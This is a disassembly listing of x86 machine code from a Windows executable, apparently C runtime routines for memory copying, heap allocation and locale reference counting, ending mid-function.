  4260f3:	jne    0x4260f6
  4260f5:	inc    esi
  4260f6:	cmp    DWORD PTR ds:0x463c44,0x1
  4260fd:	je     0x426105
  4260ff:	add    esi,0xf
  426102:	and    esi,0xfffffff0
  426105:	push   esi
  426106:	push   0x0
  426108:	push   DWORD PTR ds:0x463c40
  42610e:	call   DWORD PTR ds:0x429038
  426114:	call   0x42546f
  426119:	ret    
  42611a:	mov    esi,DWORD PTR [ebp+0x8]
  42611d:	push   0x4
  42611f:	call   0x42555b
  426124:	pop    ecx
  426125:	ret    
  426126:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42612b:	ja     0x42614f
  42612d:	push   DWORD PTR [esp+0x4]
  426131:	call   0x4260ab
  426136:	test   eax,eax
  426138:	pop    ecx
  426139:	jne    0x426151
  42613b:	cmp    DWORD PTR [esp+0x8],eax
  42613f:	je     0x426151
  426141:	push   DWORD PTR [esp+0x4]
  426145:	call   0x427d12
  42614a:	test   eax,eax
  42614c:	pop    ecx
  42614d:	jne    0x42612d
  42614f:	xor    eax,eax
  426151:	ret    
  426152:	push   DWORD PTR ds:0x4638c8
  426158:	push   DWORD PTR [esp+0x8]
  42615c:	call   0x426126
  426161:	pop    ecx
  426162:	pop    ecx
  426163:	ret    
  426164:	int3   
  426165:	int3   
  426166:	int3   
  426167:	int3   
  426168:	int3   
  426169:	int3   
  42616a:	int3   
  42616b:	int3   
  42616c:	int3   
  42616d:	int3   
  42616e:	int3   
  42616f:	int3   
  426170:	push   ebp
  426171:	mov    ebp,esp
  426173:	push   edi
  426174:	push   esi
  426175:	mov    esi,DWORD PTR [ebp+0xc]
  426178:	mov    ecx,DWORD PTR [ebp+0x10]
  42617b:	mov    edi,DWORD PTR [ebp+0x8]
  42617e:	mov    eax,ecx
  426180:	mov    edx,ecx
  426182:	add    eax,esi
  426184:	cmp    edi,esi
  426186:	jbe    0x426190
  426188:	cmp    edi,eax
  42618a:	jb     0x42630c
  426190:	test   edi,0x3
  426196:	jne    0x4261ac
  426198:	shr    ecx,0x2
  42619b:	and    edx,0x3
  42619e:	cmp    ecx,0x8
  4261a1:	jb     0x4261cc
  4261a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261a5:	jmp    DWORD PTR [edx*4+0x4262bc]
  4261ac:	mov    eax,edi
  4261ae:	mov    edx,0x3
  4261b3:	sub    ecx,0x4
  4261b6:	jb     0x4261c4
  4261b8:	and    eax,0x3
  4261bb:	add    ecx,eax
  4261bd:	jmp    DWORD PTR [eax*4+0x4261d0]
  4261c4:	jmp    DWORD PTR [ecx*4+0x4262cc]
  4261cb:	nop
  4261cc:	jmp    DWORD PTR [ecx*4+0x426250]
  4261d3:	nop
  4261d4:	loopne 0x426237
  4261d6:	inc    edx
  4261d7:	add    BYTE PTR [edx+eiz*2],cl
  4261da:	inc    edx
  4261db:	add    BYTE PTR [eax],dh
  4261dd:	bound  eax,QWORD PTR [edx+0x0]
  4261e0:	and    edx,ecx
  4261e2:	mov    al,BYTE PTR [esi]
  4261e4:	mov    BYTE PTR [edi],al
  4261e6:	mov    al,BYTE PTR [esi+0x1]
  4261e9:	mov    BYTE PTR [edi+0x1],al
  4261ec:	mov    al,BYTE PTR [esi+0x2]
  4261ef:	shr    ecx,0x2
  4261f2:	mov    BYTE PTR [edi+0x2],al
  4261f5:	add    esi,0x3
  4261f8:	add    edi,0x3
  4261fb:	cmp    ecx,0x8
  4261fe:	jb     0x4261cc
  426200:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426202:	jmp    DWORD PTR [edx*4+0x4262bc]
  426209:	lea    ecx,[ecx+0x0]
  42620c:	and    edx,ecx
  42620e:	mov    al,BYTE PTR [esi]
  426210:	mov    BYTE PTR [edi],al
  426212:	mov    al,BYTE PTR [esi+0x1]
  426215:	shr    ecx,0x2
  426218:	mov    BYTE PTR [edi+0x1],al
  42621b:	add    esi,0x2
  42621e:	add    edi,0x2
  426221:	cmp    ecx,0x8
  426224:	jb     0x4261cc
  426226:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426228:	jmp    DWORD PTR [edx*4+0x4262bc]
  42622f:	nop
  426230:	and    edx,ecx
  426232:	mov    al,BYTE PTR [esi]
  426234:	mov    BYTE PTR [edi],al
  426236:	add    esi,0x1
  426239:	shr    ecx,0x2
  42623c:	add    edi,0x1
  42623f:	cmp    ecx,0x8
  426242:	jb     0x4261cc
  426244:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426246:	jmp    DWORD PTR [edx*4+0x4262bc]
  42624d:	lea    ecx,[ecx+0x0]
  426250:	mov    bl,0x62
  426252:	inc    edx
  426253:	add    BYTE PTR [eax-0x67ffbd9e],ah
  426259:	bound  eax,QWORD PTR [edx+0x0]
  42625c:	nop
  42625d:	bound  eax,QWORD PTR [edx+0x0]
  426260:	mov    BYTE PTR [edx+0x42],ah
  426263:	add    BYTE PTR [eax+0x78004262],al
  426269:	bound  eax,QWORD PTR [edx+0x0]
  42626c:	jo     0x4262d0
  42626e:	inc    edx
  42626f:	add    BYTE PTR [ebx-0x761b71bc],cl
  426275:	inc    esp
  426276:	(bad)  
  426277:	in     al,0x8b
  426279:	inc    esp
  42627a:	mov    gs,eax
  42627c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426280:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426284:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426288:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42628c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  426290:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  426294:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  426298:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42629c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4262a0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4262a4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4262a8:	lea    eax,[ecx*4+0x0]
  4262af:	add    esi,eax
  4262b1:	add    edi,eax
  4262b3:	jmp    DWORD PTR [edx*4+0x4262bc]
  4262ba:	mov    edi,edi
  4262bc:	int3   
  4262bd:	bound  eax,QWORD PTR [edx+0x0]
  4262c0:	aam    0x62
  4262c2:	inc    edx
  4262c3:	add    al,ah
  4262c5:	bound  eax,QWORD PTR [edx+0x0]
  4262c8:	hlt    
  4262c9:	bound  eax,QWORD PTR [edx+0x0]
  4262cc:	mov    eax,DWORD PTR [ebp+0x8]
  4262cf:	pop    esi
  4262d0:	pop    edi
  4262d1:	leave  
  4262d2:	ret    
  4262d3:	nop
  4262d4:	mov    al,BYTE PTR [esi]
  4262d6:	mov    BYTE PTR [edi],al
  4262d8:	mov    eax,DWORD PTR [ebp+0x8]
  4262db:	pop    esi
  4262dc:	pop    edi
  4262dd:	leave  
  4262de:	ret    
  4262df:	nop
  4262e0:	mov    al,BYTE PTR [esi]
  4262e2:	mov    BYTE PTR [edi],al
  4262e4:	mov    al,BYTE PTR [esi+0x1]
  4262e7:	mov    BYTE PTR [edi+0x1],al
  4262ea:	mov    eax,DWORD PTR [ebp+0x8]
  4262ed:	pop    esi
  4262ee:	pop    edi
  4262ef:	leave  
  4262f0:	ret    
  4262f1:	lea    ecx,[ecx+0x0]
  4262f4:	mov    al,BYTE PTR [esi]
  4262f6:	mov    BYTE PTR [edi],al
  4262f8:	mov    al,BYTE PTR [esi+0x1]
  4262fb:	mov    BYTE PTR [edi+0x1],al
  4262fe:	mov    al,BYTE PTR [esi+0x2]
  426301:	mov    BYTE PTR [edi+0x2],al
  426304:	mov    eax,DWORD PTR [ebp+0x8]
  426307:	pop    esi
  426308:	pop    edi
  426309:	leave  
  42630a:	ret    
  42630b:	nop
  42630c:	lea    esi,[ecx+esi*1-0x4]
  426310:	lea    edi,[ecx+edi*1-0x4]
  426314:	test   edi,0x3
  42631a:	jne    0x426340
  42631c:	shr    ecx,0x2
  42631f:	and    edx,0x3
  426322:	cmp    ecx,0x8
  426325:	jb     0x426334
  426327:	std    
  426328:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42632a:	cld    
  42632b:	jmp    DWORD PTR [edx*4+0x426458]
  426332:	mov    edi,edi
  426334:	neg    ecx
  426336:	jmp    DWORD PTR [ecx*4+0x426408]
  42633d:	lea    ecx,[ecx+0x0]
  426340:	mov    eax,edi
  426342:	mov    edx,0x3
  426347:	cmp    ecx,0x4
  42634a:	jb     0x426358
  42634c:	and    eax,0x3
  42634f:	sub    ecx,eax
  426351:	jmp    DWORD PTR [eax*4+0x42635c]
  426358:	jmp    DWORD PTR [ecx*4+0x426458]
  42635f:	nop
  426360:	ins    BYTE PTR es:[edi],dx
  426361:	arpl   WORD PTR [edx+0x0],ax
  426364:	nop
  426365:	arpl   WORD PTR [edx+0x0],ax
  426368:	mov    eax,0x8a004263
  42636d:	inc    esi
  42636e:	add    esp,DWORD PTR [ebx]
  426370:	ror    DWORD PTR [eax-0x117cfcb9],1
  426376:	add    ecx,eax
  426378:	jmp    0x231e67f
  42637d:	cmp    ecx,0x8
  426380:	jb     0x426334
  426382:	std    
  426383:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426385:	cld    
  426386:	jmp    DWORD PTR [edx*4+0x426458]
  42638d:	lea    ecx,[ecx+0x0]
  426390:	mov    al,BYTE PTR [esi+0x3]
  426393:	and    edx,ecx
  426395:	mov    BYTE PTR [edi+0x3],al
  426398:	mov    al,BYTE PTR [esi+0x2]
  42639b:	shr    ecx,0x2
  42639e:	mov    BYTE PTR [edi+0x2],al
  4263a1:	sub    esi,0x2
  4263a4:	sub    edi,0x2
  4263a7:	cmp    ecx,0x8
  4263aa:	jb     0x426334
  4263ac:	std    
  4263ad:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4263af:	cld    
  4263b0:	jmp    DWORD PTR [edx*4+0x426458]
  4263b7:	nop
  4263b8:	mov    al,BYTE PTR [esi+0x3]
  4263bb:	and    edx,ecx
  4263bd:	mov    BYTE PTR [edi+0x3],al
  4263c0:	mov    al,BYTE PTR [esi+0x2]
  4263c3:	mov    BYTE PTR [edi+0x2],al
  4263c6:	mov    al,BYTE PTR [esi+0x1]
  4263c9:	shr    ecx,0x2
  4263cc:	mov    BYTE PTR [edi+0x1],al
  4263cf:	sub    esi,0x3
  4263d2:	sub    edi,0x3
  4263d5:	cmp    ecx,0x8
  4263d8:	jb     0x426334
  4263de:	std    
  4263df:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4263e1:	cld    
  4263e2:	jmp    DWORD PTR [edx*4+0x426458]
  4263e9:	lea    ecx,[ecx+0x0]
  4263ec:	or     al,0x64
  4263ee:	inc    edx
  4263ef:	add    BYTE PTR [esp+eiz*2],dl
  4263f2:	inc    edx
  4263f3:	add    BYTE PTR [esp+eiz*2],bl
  4263f6:	inc    edx
  4263f7:	add    BYTE PTR [esp+eiz*2],ah
  4263fa:	inc    edx
  4263fb:	add    BYTE PTR [esp+eiz*2],ch
  4263fe:	inc    edx
  4263ff:	add    BYTE PTR [esp+eiz*2],dh
  426402:	inc    edx
  426403:	add    BYTE PTR [esp+eiz*2],bh
  426406:	inc    edx
  426407:	add    BYTE PTR [edi+0x64],cl
  42640a:	inc    edx
  42640b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426411:	inc    esp
  426412:	(bad)  
  426413:	sbb    al,0x8b
  426415:	inc    esp
  426416:	mov    ds,WORD PTR [eax]
  426418:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42641c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426420:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426424:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426428:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42642c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426430:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426434:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426438:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42643c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426440:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426444:	lea    eax,[ecx*4+0x0]
  42644b:	add    esi,eax
  42644d:	add    edi,eax
  42644f:	jmp    DWORD PTR [edx*4+0x426458]
  426456:	mov    edi,edi
  426458:	push   0x70004264
  42645d:	fs inc edx
  42645f:	add    BYTE PTR [eax-0x6bffbd9c],al
  426465:	fs inc edx
  426467:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42646d:	leave  
  42646e:	ret    
  42646f:	nop
  426470:	mov    al,BYTE PTR [esi+0x3]
  426473:	mov    BYTE PTR [edi+0x3],al
  426476:	mov    eax,DWORD PTR [ebp+0x8]
  426479:	pop    esi
  42647a:	pop    edi
  42647b:	leave  
  42647c:	ret    
  42647d:	lea    ecx,[ecx+0x0]
  426480:	mov    al,BYTE PTR [esi+0x3]
  426483:	mov    BYTE PTR [edi+0x3],al
  426486:	mov    al,BYTE PTR [esi+0x2]
  426489:	mov    BYTE PTR [edi+0x2],al
  42648c:	mov    eax,DWORD PTR [ebp+0x8]
  42648f:	pop    esi
  426490:	pop    edi
  426491:	leave  
  426492:	ret    
  426493:	nop
  426494:	mov    al,BYTE PTR [esi+0x3]
  426497:	mov    BYTE PTR [edi+0x3],al
  42649a:	mov    al,BYTE PTR [esi+0x2]
  42649d:	mov    BYTE PTR [edi+0x2],al
  4264a0:	mov    al,BYTE PTR [esi+0x1]
  4264a3:	mov    BYTE PTR [edi+0x1],al
  4264a6:	mov    eax,DWORD PTR [ebp+0x8]
  4264a9:	pop    esi
  4264aa:	pop    edi
  4264ab:	leave  
  4264ac:	ret    
  4264ad:	push   DWORD PTR [esp+0x4]
  4264b1:	call   DWORD PTR ds:0x429108
  4264b7:	xor    eax,eax
  4264b9:	inc    eax
  4264ba:	ret    0x8
  4264bd:	push   0x10
  4264bf:	push   0x429710
  4264c4:	call   0x425434
  4264c9:	mov    eax,ds:0x463888
  4264ce:	test   eax,eax
  4264d0:	jne    0x426509
  4264d2:	cmp    DWORD PTR ds:0x4635c4,0x1
  4264d9:	je     0x4264ff
  4264db:	push   0x4296fc
  4264e0:	call   DWORD PTR ds:0x42902c
  4264e6:	test   eax,eax
  4264e8:	je     0x4264ff
  4264ea:	push   0x4296d4
  4264ef:	push   eax
  4264f0:	call   DWORD PTR ds:0x429028
  4264f6:	mov    ds:0x463888,eax
  4264fb:	test   eax,eax
  4264fd:	jne    0x426509
  4264ff:	mov    eax,0x4264ad
  426504:	mov    ds:0x463888,eax
  426509:	and    DWORD PTR [ebp-0x4],0x0
  42650d:	push   DWORD PTR [ebp+0xc]
  426510:	push   DWORD PTR [ebp+0x8]
  426513:	call   eax
  426515:	mov    DWORD PTR [ebp-0x1c],eax
  426518:	jmp    0x42653e
  42651a:	mov    eax,DWORD PTR [ebp-0x14]
  42651d:	mov    eax,DWORD PTR [eax]
  42651f:	mov    eax,DWORD PTR [eax]
  426521:	mov    DWORD PTR [ebp-0x20],eax
  426524:	xor    eax,eax
  426526:	inc    eax
  426527:	ret    
  426528:	mov    esp,DWORD PTR [ebp-0x18]
  42652b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  426532:	jne    0x42653c
  426534:	push   0x8
  426536:	call   DWORD PTR ds:0x4290d4
  42653c:	xor    eax,eax
  42653e:	or     DWORD PTR [ebp-0x4],0xffffffff
  426542:	call   0x42546f
  426547:	ret    
  426548:	push   0x10
  42654a:	push   0x429720
  42654f:	call   0x425434
  426554:	mov    esi,DWORD PTR [ebp+0x8]
  426557:	imul   esi,DWORD PTR [ebp+0xc]
  42655b:	mov    DWORD PTR [ebp-0x1c],esi
  42655e:	test   esi,esi
  426560:	jne    0x426563
  426562:	inc    esi
  426563:	xor    edi,edi
  426565:	mov    DWORD PTR [ebp-0x20],edi
  426568:	cmp    esi,0xffffffe0
  42656b:	ja     0x4265d2
  42656d:	cmp    DWORD PTR ds:0x463c44,0x3
  426574:	jne    0x4265bd
  426576:	add    esi,0xf
  426579:	and    esi,0xfffffff0
  42657c:	mov    DWORD PTR [ebp+0xc],esi
  42657f:	mov    ebx,DWORD PTR [ebp-0x1c]
  426582:	cmp    ebx,DWORD PTR ds:0x463a04
  426588:	ja     0x4265bd
  42658a:	push   0x4
  42658c:	call   0x4255ef
  426591:	pop    ecx
  426592:	and    DWORD PTR [ebp-0x4],edi
  426595:	push   ebx
  426596:	call   0x426ff1
  42659b:	pop    ecx
  42659c:	mov    DWORD PTR [ebp-0x20],eax
  42659f:	or     DWORD PTR [ebp-0x4],0xffffffff
  4265a3:	call   0x4265f2
  4265a8:	mov    edi,DWORD PTR [ebp-0x20]
  4265ab:	test   edi,edi
  4265ad:	je     0x4265c1
  4265af:	push   DWORD PTR [ebp-0x1c]
  4265b2:	push   0x0
  4265b4:	push   edi
  4265b5:	call   0x427d30
  4265ba:	add    esp,0xc
  4265bd:	test   edi,edi
  4265bf:	jne    0x4265fb
  4265c1:	push   esi
  4265c2:	push   0x8
  4265c4:	push   DWORD PTR ds:0x463c40
  4265ca:	call   DWORD PTR ds:0x429038
  4265d0:	mov    edi,eax
  4265d2:	test   edi,edi
  4265d4:	jne    0x4265fb
  4265d6:	cmp    DWORD PTR ds:0x4638c8,edi
  4265dc:	je     0x4265fb
  4265de:	push   esi
  4265df:	call   0x427d12
  4265e4:	pop    ecx
  4265e5:	test   eax,eax
  4265e7:	jne    0x426563
  4265ed:	jmp    0x4265fd
  4265ef:	mov    esi,DWORD PTR [ebp+0xc]
  4265f2:	push   0x4
  4265f4:	call   0x42555b
  4265f9:	pop    ecx
  4265fa:	ret    
  4265fb:	mov    eax,edi
  4265fd:	call   0x42546f
  426602:	ret    
  426603:	push   esi
  426604:	mov    esi,DWORD PTR [esp+0x8]
  426608:	mov    eax,DWORD PTR [esi+0x3c]
  42660b:	push   edi
  42660c:	xor    edi,edi
  42660e:	cmp    eax,DWORD PTR ds:0x4638d4
  426614:	je     0x426679
  426616:	cmp    eax,edi
  426618:	je     0x426679
  42661a:	mov    eax,DWORD PTR [esi+0x2c]
  42661d:	cmp    DWORD PTR [eax],edi
  42661f:	jne    0x426679
  426621:	mov    eax,DWORD PTR [esi+0x34]
  426624:	cmp    eax,edi
  426626:	je     0x426644
  426628:	cmp    DWORD PTR [eax],edi
  42662a:	jne    0x426644
  42662c:	cmp    eax,DWORD PTR ds:0x4639f0
  426632:	je     0x426644
  426634:	push   eax
  426635:	call   0x42603a
  42663a:	push   DWORD PTR [esi+0x3c]
  42663d:	call   0x427f7f
  426642:	pop    ecx
  426643:	pop    ecx
  426644:	mov    eax,DWORD PTR [esi+0x30]
  426647:	cmp    eax,edi
  426649:	je     0x426667
  42664b:	cmp    DWORD PTR [eax],edi
  42664d:	jne    0x426667
  42664f:	cmp    eax,DWORD PTR ds:0x4639f4
  426655:	je     0x426667
  426657:	push   eax
  426658:	call   0x42603a
  42665d:	push   DWORD PTR [esi+0x3c]
  426660:	call   0x427f20
  426665:	pop    ecx
  426666:	pop    ecx
  426667:	push   DWORD PTR [esi+0x2c]
  42666a:	call   0x42603a
  42666f:	push   DWORD PTR [esi+0x3c]
  426672:	call   0x42603a
  426677:	pop    ecx
  426678:	pop    ecx
  426679:	mov    eax,DWORD PTR [esi+0x40]
  42667c:	cmp    eax,DWORD PTR ds:0x4639ec
  426682:	je     0x42669c
  426684:	cmp    eax,edi
  426686:	je     0x42669c
  426688:	cmp    DWORD PTR [eax],edi
  42668a:	jne    0x42669c
  42668c:	push   eax
  42668d:	call   0x42603a
  426692:	push   DWORD PTR [esi+0x44]
  426695:	call   0x42603a
  42669a:	pop    ecx
  42669b:	pop    ecx
  42669c:	mov    eax,DWORD PTR [esi+0x50]
  42669f:	cmp    eax,DWORD PTR ds:0x4638d0
  4266a5:	je     0x4266c3
  4266a7:	cmp    eax,edi
  4266a9:	je     0x4266c3
  4266ab:	cmp    DWORD PTR [eax+0xb4],edi
  4266b1:	jne    0x4266c3
  4266b3:	push   eax
  4266b4:	call   0x427d90
  4266b9:	push   DWORD PTR [esi+0x50]
  4266bc:	call   0x42603a
  4266c1:	pop    ecx
  4266c2:	pop    ecx
  4266c3:	push   esi
  4266c4:	call   0x42603a
  4266c9:	pop    ecx
  4266ca:	pop    edi
  4266cb:	pop    esi
  4266cc:	ret    
  4266cd:	push   esi
  4266ce:	call   0x4252e9
  4266d3:	mov    esi,eax
  4266d5:	mov    eax,DWORD PTR [esi+0x64]
  4266d8:	cmp    eax,DWORD PTR ds:0x46308c
  4266de:	je     0x42678a
  4266e4:	test   eax,eax
  4266e6:	je     0x426717
  4266e8:	mov    ecx,DWORD PTR [eax+0x2c]
  4266eb:	dec    DWORD PTR [eax]
  4266ed:	test   ecx,ecx
  4266ef:	je     0x4266f3
  4266f1:	dec    DWORD PTR [ecx]
  4266f3:	mov    ecx,DWORD PTR [eax+0x34]
  4266f6:	test   ecx,ecx
  4266f8:	je     0x4266fc
  4266fa:	dec    DWORD PTR [ecx]
  4266fc:	mov    ecx,DWORD PTR [eax+0x30]
  4266ff:	test   ecx,ecx
  426701:	je     0x426705
  426703:	dec    DWORD PTR [ecx]
  426705:	mov    ecx,DWORD PTR [eax+0x40]
  426708:	test   ecx,ecx
  42670a:	je     0x42670e
  42670c:	dec    DWORD PTR [ecx]
  42670e:	mov    ecx,DWORD PTR [eax+0x4c]
  426711:	dec    DWORD PTR [ecx+0xb4]
  426717:	mov    ecx,DWORD PTR ds:0x46308c
  42671d:	mov    DWORD PTR [esi+0x64],ecx
  426720:	mov    ecx,DWORD PTR ds:0x46308c
  426726:	inc    DWORD PTR [ecx]
  426728:	mov    ecx,DWORD PTR ds:0x46308c
  42672e:	mov    ecx,DWORD PTR [ecx+0x2c]
  426731:	test   ecx,ecx
  426733:	je     0x426737
  426735:	inc    DWORD PTR [ecx]
  426737:	mov    ecx,DWORD PTR ds:0x46308c
  42673d:	mov    ecx,DWORD PTR [ecx+0x34]
  426740:	test   ecx,ecx
  426742:	je     0x426746
  426744:	inc    DWORD PTR [ecx]
  426746:	mov    ecx,DWORD PTR ds:0x46308c
  42674c:	mov    ecx,DWORD PTR [ecx+0x30]
  42674f:	test   ecx,ecx
  426751:	je     0x426755
  426753:	inc    DWORD PTR [ecx]
  426755:	mov    ecx,DWORD PTR ds:0x46308c
  42675b:	mov    ecx,DWORD PTR [ecx+0x40]
  42675e:	test   ecx,ecx
  426760:	je     0x426764
  426762:	inc    DWORD PTR [ecx]
  426764:	mov    ecx,DWORD PTR ds:0x46308c
  42676a:	mov    ecx,DWORD PTR [ecx+0x4c]
  42676d:	inc    DWORD PTR [ecx+0xb4]
  426773:	test   eax,eax
  426775:	je     0x42678a
  426777:	cmp    DWORD PTR [eax],0x0
  42677a:	jne    0x42678a
  42677c:	cmp    eax,0x463038
  426781:	je     0x42678a
  426783:	push   eax
  426784:	call   0x426603
  426789:	pop    ecx
  42678a:	mov    eax,DWORD PTR [esi+0x64]
  42678d:	pop    esi
  42678e:	ret    
  42678f:	push   0xc
  426791:	push   0x4298b0
  426796:	call   0x425434
  42679b:	push   0xc
  42679d:	call   0x4255ef
  4267a2:	pop    ecx
  4267a3:	and    DWORD PTR [ebp-0x4],0x0
  4267a7:	call   0x4266cd
  4267ac:	mov    DWORD PTR [ebp-0x1c],eax
  4267af:	or     DWORD PTR [ebp-0x4],0xffffffff
  4267b3:	call   0x4267c1
  4267b8:	mov    eax,DWORD PTR [ebp-0x1c]
  4267bb:	call   0x42546f
  4267c0:	ret    
  4267c1:	push   0xc
  4267c3:	call   0x42555b
  4267c8:	pop    ecx
  4267c9:	ret    
  4267ca:	push   0x140
  4267cf:	push   0x0
  4267d1:	push   DWORD PTR ds:0x463c40
  4267d7:	call   DWORD PTR ds:0x429038
  4267dd:	test   eax,eax
  4267df:	mov    ds:0x463a00,eax
  4267e4:	jne    0x4267e7
  4267e6:	ret    
  4267e7:	mov    ecx,DWORD PTR [esp+0x4]
  4267eb:	and    DWORD PTR ds:0x4639f8,0x0
  4267f2:	and    DWORD PTR ds:0x4639fc,0x0
  4267f9:	mov    ds:0x463a08,eax
  4267fe:	xor    eax,eax
  426800:	mov    DWORD PTR ds:0x463a04,ecx
  426806:	mov    DWORD PTR ds:0x463a0c,0x10
  426810:	inc    eax
  426811:	ret    
  426812:	mov    eax,ds:0x4639fc
  426817:	lea    ecx,[eax+eax*4]
  42681a:	mov    eax,ds:0x463a00
  42681f:	lea    ecx,[eax+ecx*4]
  426822:	jmp    0x426836
  426824:	mov    edx,DWORD PTR [esp+0x4]
  426828:	sub    edx,DWORD PTR [eax+0xc]
  42682b:	cmp    edx,0x100000
  426831:	jb     0x42683c
  426833:	add    eax,0x14
  426836:	cmp    eax,ecx
  426838:	jb     0x426824
  42683a:	xor    eax,eax
  42683c:	ret    
  42683d:	push   ebp
  42683e:	mov    ebp,esp
  426840:	sub    esp,0x10
  426843:	mov    ecx,DWORD PTR [ebp+0x8]
  426846:	mov    eax,DWORD PTR [ecx+0x10]
  426849:	push   esi
  42684a:	mov    esi,DWORD PTR [ebp+0xc]
  42684d:	push   edi
  42684e:	mov    edi,esi
  426850:	sub    edi,DWORD PTR [ecx+0xc]
  426853:	add    esi,0xfffffffc
  426856:	shr    edi,0xf
  426859:	mov    ecx,edi
  42685b:	imul   ecx,ecx,0x204
  426861:	lea    ecx,[ecx+eax*1+0x144]
  426868:	mov    DWORD PTR [ebp-0x10],ecx
  42686b:	mov    ecx,DWORD PTR [esi]
  42686d:	dec    ecx
  42686e:	test   cl,0x1
  426871:	mov    DWORD PTR [ebp-0x4],ecx
  426874:	jne    0x426b51
  42687a:	push   ebx
  42687b:	lea    ebx,[ecx+esi*1]
  42687e:	mov    edx,DWORD PTR [ebx]
  426880:	mov    DWORD PTR [ebp-0xc],edx
  426883:	mov    edx,DWORD PTR [esi-0x4]
  426886:	mov    DWORD PTR [ebp-0x8],edx
  426889:	mov    edx,DWORD PTR [ebp-0xc]
  42688c:	test   dl,0x1
  42688f:	mov    DWORD PTR [ebp+0xc],ebx
  426892:	jne    0x426908
  426894:	sar    edx,0x4
  426897:	dec    edx
  426898:	cmp    edx,0x3f
  42689b:	jbe    0x4268a0
  42689d:	push   0x3f
  42689f:	pop    edx
  4268a0:	mov    ecx,DWORD PTR [ebx+0x4]
  4268a3:	cmp    ecx,DWORD PTR [ebx+0x8]
  4268a6:	jne    0x4268ea
  4268a8:	cmp    edx,0x20
  4268ab:	mov    ebx,0x80000000
  4268b0:	jae    0x4268cb
  4268b2:	mov    ecx,edx
  4268b4:	shr    ebx,cl
  4268b6:	lea    ecx,[edx+eax*1+0x4]
  4268ba:	not    ebx
  4268bc:	and    DWORD PTR [eax+edi*4+0x44],ebx
  4268c0:	dec    BYTE PTR [ecx]
  4268c2:	jne    0x4268e7
  4268c4:	mov    ecx,DWORD PTR [ebp+0x8]
  4268c7:	and    DWORD PTR [ecx],ebx
  4268c9:	jmp    0x4268e7
  4268cb:	lea    ecx,[edx-0x20]
  4268ce:	shr    ebx,cl
  4268d0:	lea    ecx,[edx+eax*1+0x4]
  4268d4:	not    ebx
  4268d6:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  4268dd:	dec    BYTE PTR [ecx]
  4268df:	jne    0x4268e7
  4268e1:	mov    ecx,DWORD PTR [ebp+0x8]
  4268e4:	and    DWORD PTR [ecx+0x4],ebx
  4268e7:	mov    ebx,DWORD PTR [ebp+0xc]
  4268ea:	mov    edx,DWORD PTR [ebx+0x8]
  4268ed:	mov    ebx,DWORD PTR [ebx+0x4]
  4268f0:	mov    ecx,DWORD PTR [ebp-0x4]
  4268f3:	add    ecx,DWORD PTR [ebp-0xc]
  4268f6:	mov    DWORD PTR [edx+0x4],ebx
  4268f9:	mov    edx,DWORD PTR [ebp+0xc]
  4268fc:	mov    ebx,DWORD PTR [edx+0x4]
  4268ff:	mov    edx,DWORD PTR [edx+0x8]
  426902:	mov    DWORD PTR [ebx+0x8],edx
  426905:	mov    DWORD PTR [ebp-0x4],ecx
  426908:	mov    edx,ecx
  42690a:	sar    edx,0x4
  42690d:	dec    edx
  42690e:	cmp    edx,0x3f
  426911:	jbe    0x426916
  426913:	push   0x3f
  426915:	pop    edx
  426916:	mov    ebx,DWORD PTR [ebp-0x8]
  426919:	and    ebx,0x1
  42691c:	mov    DWORD PTR [ebp-0xc],ebx
  42691f:	jne    0x4269b4
  426925:	sub    esi,DWORD PTR [ebp-0x8]
  426928:	mov    ebx,DWORD PTR [ebp-0x8]
  42692b:	sar    ebx,0x4
  42692e:	push   0x3f
  426930:	mov    DWORD PTR [ebp+0xc],esi
  426933:	dec    ebx
  426934:	pop    esi
  426935:	cmp    ebx,esi
  426937:	jbe    0x42693b
  426939:	mov    ebx,esi
  42693b:	add    ecx,DWORD PTR [ebp-0x8]
  42693e:	mov    edx,ecx
  426940:	sar    edx,0x4
  426943:	dec    edx
  426944:	cmp    edx,esi
  426946:	mov    DWORD PTR [ebp-0x4],ecx
  426949:	jbe    0x42694d
  42694b:	mov    edx,esi
  42694d:	cmp    ebx,edx
  42694f:	je     0x4269af
  426951:	mov    ecx,DWORD PTR [ebp+0xc]
  426954:	mov    esi,DWORD PTR [ecx+0x4]
  426957:	cmp    esi,DWORD PTR [ecx+0x8]
  42695a:	jne    0x426997
  42695c:	cmp    ebx,0x20
  42695f:	mov    esi,0x80000000
  426964:	jae    0x42697d
  426966:	mov    ecx,ebx
  426968:	shr    esi,cl
  42696a:	not    esi
  42696c:	and    DWORD PTR [eax+edi*4+0x44],esi
  426970:	dec    BYTE PTR [ebx+eax*1+0x4]
